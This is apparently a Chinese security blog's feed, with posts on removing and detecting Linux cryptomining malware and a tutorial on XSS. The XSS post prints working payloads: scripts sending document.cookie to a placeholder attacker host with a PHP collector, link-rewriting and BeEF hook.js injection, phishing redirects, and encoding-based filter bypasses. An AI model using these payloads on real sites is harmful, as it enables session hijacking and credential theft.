    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="恶意挖矿清除"><a href="#恶意挖矿清除" class="headerlink" title="恶意挖矿清除"></a>恶意挖矿清除</h1><h2 id="清除恶意程序计划任务"><a href="#清除恶意程序计划任务" class="headerlink" title="清除恶意程序计划任务"></a>清除恶意程序计划任务</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">编辑 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root 和&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</span><br><span class="line">删除恶意计划任务内容</span><br></pre></td></tr></table></figure><h2 id="杀死恶意程序进程"><a href="#杀死恶意程序进程" class="headerlink" title="杀死恶意程序进程"></a>杀死恶意程序进程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在知道恶意程序名称情况下：</span><br><span class="line">ps -ef | grep 恶意程序名称</span><br></pre></td></tr></table></figure><p>在定位到恶意程序在系统中的位置后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pkill 直接杀死程序</span><br><span class="line">Kill -9 PID</span><br></pre></td></tr></table></figure><h2 id="清除恶意程序"><a href="#清除恶意程序" class="headerlink" title="清除恶意程序"></a>清除恶意程序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm –rf 恶意程序物理地址</span><br></pre></td></tr></table></figure><h2 id="iptables禁止恶意程序联网"><a href="#iptables禁止恶意程序联网" class="headerlink" title="iptables禁止恶意程序联网"></a>iptables禁止恶意程序联网</h2><p>检查恶意程序外网互联地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat –pantul | grep ESTAB</span><br></pre></td></tr></table></figure><p>下发外网访问控制策略</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">依据查询出的外网互联地址，直接下发访问控制策略，禁止服务访问这些网络地址</span><br><span class="line">iptables –A OUTPUT –d xx.x.xx.xx –j DROP</span><br><span class="line">重启设备</span><br></pre></td></tr></table></figure><h2 id="重做系统"><a href="#重做系统" class="headerlink" title="重做系统"></a>重做系统</h2><p>中了恶意程序的机器，在清除恶意程序后，最后都要重做系统。</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="恶意代码" scheme="http://yoursite.com/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    
      <category term="挖矿" scheme="http://yoursite.com/tags/%E6%8C%96%E7%9F%BF/"/>
    
  </entry>
  
  <entry>
    <title>检测恶意挖矿</title>
    <link href="http://yoursite.com/2020/07/10/%E6%A3%80%E6%B5%8B%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF/"/>
    <id>http://yoursite.com/2020/07/10/检测恶意挖矿/</id>
    <published>2020-07-10T04:00:22.000Z</published>
    <updated>2020-07-10T04:13:49.988Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="Linux下检测恶意挖矿行为"><a href="#Linux下检测恶意挖矿行为" class="headerlink" title="Linux下检测恶意挖矿行为"></a>Linux下检测恶意挖矿行为</h1><h2 id="Linux知识"><a href="#Linux知识" class="headerlink" title="Linux知识"></a>Linux知识</h2><p>ps命令：可查看当前系统的进程状态，搭配kill指令随时中断、删除不必要的程序。使用该命令可以确定有哪些进程正在运行和运行的状态等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill进程：kill -9 进程id</span><br></pre></td></tr></table></figure><p>top命令：实时动态地查看系统的整体运行情况。</p><p>netstat 命令：查看Linux系统中网络系统的状态信息。</p><p>cron服务：计划任务</p><h2 id="异常进程排查"><a href="#异常进程排查" class="headerlink" title="异常进程排查"></a>异常进程排查</h2><p>1.查看进程使用CPU和内存的情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top –c</span><br></pre></td></tr></table></figure><p>-c参数可直接查找到异常程序的物理位置。通过查看消耗CPU和内存较多的程序是否是未知程序。</p><p>2.grep 恶意程序名称</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果知道恶意程序的名称，直接通过ps –ef | grep 恶意进程名称</span><br></pre></td></tr></table></figure><h2 id="异常会话排查"><a href="#异常会话排查" class="headerlink" title="异常会话排查"></a>异常会话排查</h2><p>查看是否有异常会话连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat –pantul | grep ESTAB</span><br></pre></td></tr></table></figure><h2 id="计划任务排查"><a href="#计划任务排查" class="headerlink" title="计划任务排查"></a>计划任务排查</h2><p>1.查看是否存在异常未知任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询当前计划任务中是否存在异常未知任务:</span><br><span class="line">crontab –l</span><br></pre></td></tr></table></figure><p>2.查看root用户任务计划</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</span><br></pre></td></tr></table></figure><p>3.查看计划任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>【https:]//www[.]hetianlab.com/expc.do?ce=94f48620-eda1-4939-b0a1-34154279dc3d</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="恶意代码" scheme="http://yoursite.com/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    
      <category term="挖矿" scheme="http://yoursite.com/tags/%E6%8C%96%E7%9F%BF/"/>
    
  </entry>
  
  <entry>
    <title>XSS漏洞及防御</title>
    <link href="http://yoursite.com/2020/07/05/XSS%E6%BC%8F%E6%B4%9E%E5%8F%8A%E9%98%B2%E5%BE%A1/"/>
    <id>http://yoursite.com/2020/07/05/XSS漏洞及防御/</id>
    <published>2020-07-05T08:55:26.000Z</published>
    <updated>2020-07-05T08:58:31.060Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>XSS漏洞：</p><p>跨站脚本攻击，为了不和层叠样式表的CSS混肴，缩写为XSS。<br>恶意攻击者在浏览器web界面插入恶意script代码，当用户浏览该页面时，嵌入其中的script代码会被执行，从而达到恶意攻击用户的目的。</p><h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.反射型XSS</span><br><span class="line">反射型XSS的攻击往往具有一次性。</span><br><span class="line"></span><br><span class="line">2.存储型XSS</span><br><span class="line">持久性XSS，攻击脚本存储在目标服务器中，每次访问该页面的用户都会被攻击。</span><br><span class="line"></span><br><span class="line">3.DOM型XSS</span><br><span class="line">全称Document Object Model，使用DOM动态访问更新文档的内容、结构及样式。</span><br><span class="line">HTML标签都是节点，节点组成了节点树，通过HTML DOM可以对树上所有节点进行修改。</span><br></pre></td></tr></table></figure><h2 id="XSS盗取cookie"><a href="#XSS盗取cookie" class="headerlink" title="XSS盗取cookie"></a>XSS盗取cookie</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1.cookie</span><br><span class="line">cookie是HTTP协议下，服务器维护用户信息的方式。cookie是由web服务器保存在用户浏览器上的小文本文件，包含相关用户信息。</span><br><span class="line">有些cookie是临时的，有的是持续的。临时的cookie只在浏览器上保存一段时间，一旦超过规定时间，该cookie就会被系统清除。</span><br><span class="line"></span><br><span class="line">服务器可以利用cookie包含信息的任意性来筛选并经常性维护这些信息，以判断在HTTP传输中的状态。</span><br><span class="line">cookies最典型的应用是判定注册用户是否已经登录网站，会提示用户是否保留用户信息以便下次登录。</span><br><span class="line"></span><br><span class="line">2.反射型XSS盗取cookie</span><br><span class="line">存在反射型XSS漏洞的站点，可以利用以下链接来盗取cookie：</span><br><span class="line">url?uanme&#x3D;&lt;script&gt;document.location&#x3D;&#39;http:&#x2F;&#x2F;ip&#x2F;cookie.php?cookie&#x3D;&#39;+docunment.cookie&lt;&#x2F;script&gt;</span><br><span class="line">将链接发送给用户，用户点击即触发XSS漏洞。</span><br><span class="line"></span><br><span class="line">cookie.php代码：</span><br><span class="line">&lt;?php</span><br><span class="line">$cookie&#x3D;$_GET[&#39;cookie&#39;];</span><br><span class="line">file_put_contents(&#39;cookie.txt&#39;,$cookie);</span><br><span class="line">?&gt;</span><br><span class="line">http:&#x2F;&#x2F;xxx.xxx.com&#x2F;?name&#x3D;&lt;script&gt;docunment.location&#x3D;&#39;http:&#x2F;&#x2F;xxx.com&#x2F;cookie.php?cookie&#x3D;&#39;+document.cookie&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">3.利用cookie会话劫持</span><br><span class="line">打开偷到的cookie，找到cookie值，访问目标站点，修改cookie为偷到的cookie内容。</span><br><span class="line"></span><br><span class="line">3.劫持会话后的操作</span><br><span class="line">进入后台上传webshell；</span><br><span class="line">修改配置</span><br></pre></td></tr></table></figure><h2 id="XSS篡改网页链接"><a href="#XSS篡改网页链接" class="headerlink" title="XSS篡改网页链接"></a>XSS篡改网页链接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1.JS代码</span><br><span class="line">window.onload 当窗口加载时，执行匿名函数。</span><br><span class="line"></span><br><span class="line">使用for循环遍历所有获得的链接a标签:</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.onload&#x3D;function()&#123;</span><br><span class="line">var link&#x3D;cocument.getElmentsByTagName(&quot;a&quot;);</span><br><span class="line">for(j&#x3D;0;j&lt;link.length;j++)</span><br><span class="line">&#123;</span><br><span class="line">link[j].href&#x3D;&quot;http:&#x2F;&#x2F;attacker-site.com&quot;;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">2.XSS篡改链接</span><br><span class="line">将篡改的代码注入到对应的XSS位置。</span><br><span class="line"></span><br><span class="line">3.篡改链接指向流量网站</span><br><span class="line">刷流量，某些站点的重定向。</span><br><span class="line"></span><br><span class="line">4.篡改链接指向恶意URL</span><br><span class="line">使用Beef进行恶意链接生成，以及利用hook.js执行其他命令。</span><br><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;xxx.xx.xx.xx:xxx&#x2F;hook.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="XSS盗取用户信息"><a href="#XSS盗取用户信息" class="headerlink" title="XSS盗取用户信息"></a>XSS盗取用户信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.盗取用户信息原理</span><br><span class="line">克隆网站登录页面，利用存储XSS设置跳转代码，如果用户访问即跳转到克隆网站的登录页面，用户输入登录，用户名、密码被存储。</span><br><span class="line"></span><br><span class="line">2.setookit工具克隆网站</span><br><span class="line">kali自带社工工具。</span><br><span class="line"></span><br><span class="line">3.存储XSS跳转克隆网站</span><br><span class="line">XSS payload：</span><br><span class="line">&lt;script&gt;window.location&#x3D;&quot;http:&#x2F;&#x2F;xxx.x.x.xx&quot;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="没有过滤的XSS"><a href="#没有过滤的XSS" class="headerlink" title="没有过滤的XSS"></a>没有过滤的XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.实验环境</span><br><span class="line">https:&#x2F;&#x2F;xss-quiz.init21h.jp&#x2F;</span><br><span class="line">一个日本安全研究员制作的XSS练习靶场。</span><br><span class="line"></span><br><span class="line">2.html中文本标签b介绍</span><br><span class="line">&lt;b&gt;标签规定粗体文本。</span><br><span class="line"></span><br><span class="line">3.对该实验环境探测过程</span><br><span class="line">(1)构造一个不会识别为恶意代码的字符串提交到页面；</span><br><span class="line">(2)使用浏览器审查工具进行代码审查，寻找构造的字符串是否在页面中显示。</span><br><span class="line"></span><br><span class="line">4.闭合文本标签利用XSS</span><br><span class="line">简单payload：</span><br><span class="line">&lt;script&gt;alert(document.domain);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">闭合标签payload：</span><br><span class="line">&lt;&#x2F;b&gt;&lt;script&gt;alert(documnet.domain);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="属性中的XSS"><a href="#属性中的XSS" class="headerlink" title="属性中的XSS"></a>属性中的XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.配置Google关闭XSS-Auditor</span><br><span class="line">配置chrome --args --disable-xss-auditor</span><br><span class="line"></span><br><span class="line">2.属性中的XSS</span><br><span class="line">ctrl+F搜索特定的字符串</span><br><span class="line"></span><br><span class="line">3.闭合属性引入script</span><br><span class="line">原属性位置：&lt;input value&#x3D;&quot;&quot;&gt;</span><br><span class="line">闭合引号、尖括号，引入script脚本：</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">闭合属性引入事件触发XSS：</span><br><span class="line">&quot; onmouseover&#x3D;alert(document.domain)&gt;</span><br></pre></td></tr></table></figure><h2 id="选择列表中的XSS"><a href="#选择列表中的XSS" class="headerlink" title="选择列表中的XSS"></a>选择列表中的XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.HTML select标签介绍</span><br><span class="line">select元素可创建单选或多选菜单。</span><br><span class="line">&lt;select&gt;元素中的&lt;option&gt;标签用于定义列表中的可用选项。</span><br><span class="line"></span><br><span class="line">2.表单</span><br><span class="line">HTML表单用于搜集不同类型的用户输入。</span><br><span class="line"></span><br><span class="line">3.使用Burp进行测试</span><br><span class="line">使用Burpsuite截取HTTP请求，修改提交参数。</span><br><span class="line"></span><br><span class="line">4.闭合触发XSS</span><br><span class="line">&lt;&#x2F;option&gt;&lt;script&gt;alert(documnet.domain)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="选择参数中的XSS"><a href="#选择参数中的XSS" class="headerlink" title="选择参数中的XSS"></a>选择参数中的XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.HTML表单隐藏参数</span><br><span class="line">隐藏域是用来收集或发送信息的不可见元素，对于网页访问者来说，隐藏域是看不见的，当表单被提交时，隐藏域就会将信息用设置时定义的名称和值发送到服务器上。</span><br><span class="line"></span><br><span class="line">2.HTML中svg介绍</span><br><span class="line">SVG意为可缩放矢量图形，SVG使用XML格式定义图像。</span><br><span class="line">SVG文件可通过一下标签嵌入HTML文档:&lt;embed&gt;、&lt;object&gt;或&lt;iframe&gt;，也可使用svg标签插入。</span><br><span class="line">&lt;svg&#x2F;事件&#x3D;&quot;&quot;&gt;</span><br><span class="line"></span><br><span class="line">4.闭合触发XSS</span><br><span class="line">paylaod: &quot;&gt;&lt;svg onload&#x3D;alert(document.domain)&gt;%0a</span><br></pre></td></tr></table></figure><h2 id="限制长度的XSS"><a href="#限制长度的XSS" class="headerlink" title="限制长度的XSS"></a>限制长度的XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.HTML表单文本框</span><br><span class="line">HTML表单用于搜集不同类型的用户输入。表单元素指的是不同类型的input元素、复选框、单选按钮、提交按钮等。text定义常规文本输入。</span><br><span class="line"></span><br><span class="line">属性：</span><br><span class="line">value属性规定输入字段的初始值；</span><br><span class="line">readonly属性规定输入字段为只读(不能修改)；</span><br><span class="line">disabled属性规定输入字段是禁用的；</span><br><span class="line">size属性规定输入字段的尺寸(以字符计)；</span><br><span class="line">maxlength属性规定输入字段允许的最大长度，如设置maxlength属性，则输入控件不会接受超过所允许数的字符。</span><br><span class="line"></span><br><span class="line">2.XSS payload长度计算</span><br><span class="line">使用python内置函数len(字符串)计算对应的字节数。</span><br></pre></td></tr></table></figure><h2 id="JavaScript伪协议触发XSS"><a href="#JavaScript伪协议触发XSS" class="headerlink" title="JavaScript伪协议触发XSS"></a>JavaScript伪协议触发XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1.javascript伪协议</span><br><span class="line">将javascript代码添加到客户端的方法就是把它放置在伪协议说明符javascript:后的URL中。</span><br><span class="line">这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。</span><br><span class="line">如果javascript：URL中的javascript代码含有多个语句，必须使用分号将这些语句分隔开。</span><br><span class="line">javascript:var new Date();&quot;&lt;h1&gt; The time is:&lt;&#x2F;h1&gt;&quot;+now;</span><br><span class="line"></span><br><span class="line">javascript URL还可以含有只执行动作，但不返回值的javascript语句.</span><br><span class="line">javascript:alert(&quot;hello world&quot;)</span><br><span class="line"></span><br><span class="line">2.a链接标签属性href</span><br><span class="line">&lt;a&gt;标签定义超链接，用于从一个页面链接到另一个页面；</span><br><span class="line">&lt;a&gt;元素最重要的属性是href属性，它指定链接的目标；</span><br><span class="line">在所有的浏览器中，链接的默认外观为：</span><br><span class="line">未被访问的链接带有下划线且是蓝色的；</span><br><span class="line">已被访问的链接带有下划线且是紫色的；</span><br><span class="line">活动链接带有下划线且是红色的。</span><br><span class="line"></span><br><span class="line">3.触发XSS</span><br><span class="line">payload:javascipt:alert(document.domain)</span><br></pre></td></tr></table></figure><h2 id="绕过过滤domain为空的XSS"><a href="#绕过过滤domain为空的XSS" class="headerlink" title="绕过过滤domain为空的XSS"></a>绕过过滤domain为空的XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.XSS漏洞发现</span><br><span class="line">构造特殊无害字符串，响应中寻找字符串。</span><br><span class="line">绕过思路：寻找过滤内容</span><br><span class="line">绕过策略：双写绕过、编码绕过</span><br><span class="line"></span><br><span class="line">2.双写绕过</span><br><span class="line">payload:&quot;&gt;&lt;script&gt;alert(document.dodomainmain);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">3.编码绕过</span><br><span class="line">payload:&quot;&gt;&lt;script&gt;eval(atob(&#39;YWXXXXXXXXX&#x3D;&#x3D;&#39;));&lt;&#x2F;script&gt;</span><br><span class="line">atob可将base64编码后的密文转化为明文。</span><br></pre></td></tr></table></figure><h2 id="绕过替换script和on事件的XSS"><a href="#绕过替换script和on事件的XSS" class="headerlink" title="绕过替换script和on事件的XSS"></a>绕过替换script和on事件的XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.绕过思路</span><br><span class="line">寻找过滤内容</span><br><span class="line"></span><br><span class="line">2.伪协议绕过</span><br><span class="line">payload:&quot;&gt;&lt;a href&#x3D;&quot;javascript:alert(document.domain)&quot;&gt;xss&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">3.空格绕过</span><br><span class="line">paylaod:&quot;&gt;&lt;a href&#x3D;&quot;javascr   ipt:alert(document.domain);&quot;&gt;xss&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><h2 id="十六进制绕过触发XSS"><a href="#十六进制绕过触发XSS" class="headerlink" title="十六进制绕过触发XSS"></a>十六进制绕过触发XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.16进制</span><br><span class="line">16进制转换，16进制每一位上可以是从小到大为0，1，2，3，4，5，6，7，8，9，A,B,C,D,E,F 16个大小不同的数，即逢16进1.</span><br><span class="line">其中用A,B,C,D,E,F(不区分大小写)来分别表示10，11，12，13，14，15</span><br><span class="line"></span><br><span class="line">使用python将字符转换为16进制类型：</span><br><span class="line">print(&quot;\\x&quot;+binascii.ba2_hex(s))</span><br><span class="line"></span><br><span class="line">2.双斜杠+十六进制绕过</span><br><span class="line">\\x32 \\x3c</span><br><span class="line"></span><br><span class="line">3.触发XSS</span><br><span class="line">payload:\\x3cscript\\x3ealert(document.domain);\\x3c&#x2F;script\\x3e</span><br></pre></td></tr></table></figure><h2 id="unicode绕过触发XSS"><a href="#unicode绕过触发XSS" class="headerlink" title="unicode绕过触发XSS"></a>unicode绕过触发XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.unicode介绍</span><br><span class="line">Unicode包括字符集和编码方案，Unicode是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。</span><br><span class="line"></span><br><span class="line">使用python将字符转换为unicode类型：</span><br><span class="line">print &quot;\\u00&quot;+binascii.b2a_hex(&quot;&gt;&quot;)</span><br><span class="line"></span><br><span class="line">2.双斜杠+unicode绕过</span><br><span class="line">3.触发XSS</span><br><span class="line">payload:\\u003cscript\\u003ealert(document.domain);\\u003c&#x2F;script\\u003e</span><br></pre></td></tr></table></figure><h2 id="浏览器同源策略"><a href="#浏览器同源策略" class="headerlink" title="浏览器同源策略"></a>浏览器同源策略</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">1.源的含义</span><br><span class="line">源头，信息来源的位置。</span><br><span class="line">在计算机中源是由协议、主机名、端口名组成。</span><br><span class="line">范例：</span><br><span class="line">协议:&#x2F;&#x2F;主机名:端口号&#x2F;</span><br><span class="line"></span><br><span class="line">2.同源策略</span><br><span class="line">在计算机中，同源策略(same-orgin plicy,SOP)用于阻止一个非同源的页面恶意代码去访问另一个非同源页面。</span><br><span class="line">只有两个页面属于同一个源才能互相访问。不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。所有a.com下的js脚本读取b.com里面的文件数据会报错。</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">源A页面要访问源B页面认证Cookie，如果不加阻止读取cookie，会造成Cookie欺骗绕过登录验证。</span><br><span class="line">注意：同源一定是协议、主机名、端口号完全一致。</span><br><span class="line"></span><br><span class="line">3.IE源的特殊处理</span><br><span class="line">(1)位于可信域trust zones的互信域名间，不受同源策略限制</span><br><span class="line">(2)IE在判断同源时不考虑端口。</span><br><span class="line"></span><br><span class="line">4.document.domain</span><br><span class="line">domain属性可以解决因同源安全策略带来的不同文档的属性共享问题，降域document.domain</span><br><span class="line">同源策略认为域和子域属于不同的域，如：</span><br><span class="line">child.a.com和a.com</span><br><span class="line">child1.a.com合child2.a.com</span><br><span class="line">xxx.child1.a.com合child1.a.com</span><br><span class="line">两两不同源，可以通过设置document.domain&#x3D;&#39;a.com&#39;,浏览器就会认为它们属于同一个源。</span><br><span class="line">想要实现以上任意两个页面之间的通信，两个页面必须都设置document.domain&#x3D;&#39;a.com&#39;</span><br></pre></td></tr></table></figure><h2 id="编码转义"><a href="#编码转义" class="headerlink" title="编码转义"></a>编码转义</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.URL编码</span><br><span class="line">考虑到安全传输问题，防止url字符丢失，并且进一步保证完整性，url引入了转义机制，将不安全的字符编码为安全的字符再进行传输。</span><br><span class="line"></span><br><span class="line">2.html编码</span><br><span class="line">一些保留字符出现在文本节点和标签值里是不安全的。比如&quot;&lt;&gt;&quot;会被浏览器误认为标签，如果想要正确的显示这些字符，需要用到html编码。</span><br><span class="line"></span><br><span class="line">实体编码：一般以&quot;&amp;&quot;开头，&quot;;&quot;结尾，可以不加&quot;;&quot;。</span><br><span class="line">进制编码：以&quot;&amp;#&quot;开头，加上字符的数值，&quot;;&quot;结尾，可以不加&quot;;&quot;。字符的数值可以是任意十进制ascii码或Unicode字符编码。</span><br><span class="line">十六进制的数值需要在编码数字前加&quot;x&quot;。</span><br><span class="line"></span><br><span class="line">3.javascript编码</span><br><span class="line">数字形式：</span><br><span 